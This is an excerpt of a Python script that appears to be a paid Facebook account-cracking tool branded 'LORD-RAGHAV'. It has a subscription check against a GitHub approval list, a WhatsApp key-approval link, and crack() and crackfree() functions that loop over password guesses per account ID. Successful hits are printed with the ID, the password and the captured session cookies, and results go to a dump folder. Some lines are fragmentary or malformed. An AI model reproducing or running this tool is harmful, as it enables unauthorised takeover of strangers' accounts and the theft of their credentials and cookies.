...
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-RAGHAV ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • RAGHAV LORD]    ║  \033[1;97m  
╠══[Github                   • \33[1;38mLORD-RAGHAV ]   ║\33[1;34m   
...
def Subscraption():
    ...
    os.system('clear')
    print(logo)
    r1 = requests.get("https://github.com/raghavhero/Approval.txt/blob/main/Paid").text
    if id in r1:
        os.system('clear')
        print(logo)
    else:
        ...
        os.system('clear')
        print(logo)
        print("\033[1;39m[\033[1;32m●\033[1;39m] \033[1;32m15 Days 500 Nrs \033[0;92m")
        print("\033[1;39m[\033[1;32m+\033[1;39m] \033[1;32m30 Days 800 Nrs \033[0;92m")
        print("\033[1;39m[\033[1;32m●\033[1;39m]\033[1;33m RagHavey TooLs Daily Update)✅ \033[0;92m")
        ...
        time.sleep(3.5)
        message = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+tks = f'https://wa.me/+9779742828627?text={message}'
...
os.system('espeak -a 300 " Welcome,   to,  Raghav,  King,  Tools"')
pass
...
def login_lagi334():
    try:
      ...
      #exit()
        ...
        exit()
	 \x1b[92;1mTHIS TOOL CRATE BY LORD-RAGHAV
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[ R A G H A V ]  {P}{b}{loop}{P}•{b}{len(id)}{P}   OK:{P}{H}{ok}{P}   CP:{P}{M}{cp}{P}  {bo}{'{:.0%}'.format(loop/float(len(id)))}{asu}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{M}[ LORD-RAGHAV-CP] {M}{idf}•{pw} \n')     
				...
				if 'no' in taplikasi:
					...
					print(f'\r{h}[ LORD-RAGHAV-OK] {H}{idf}•{pw} \n')
					print(f'\r{h}└─COOKIES: {kuki}\n')
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[ R A G H A V ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{P})  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'[🕸️] ID       : {idf} [👾] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='LORD RAGHAV CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='LORD RAGHAV OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					...
					print('\n')
					statusok = f'[bold green][🕸️] ID       : {idf}\n[👾] PASSWORD : {pw}\n[🍪] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]LORD RAGHAV OK[/bold green]'))
					ok+=1
					break
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/LORD-RAGHAV-DUMP')
	except:pass
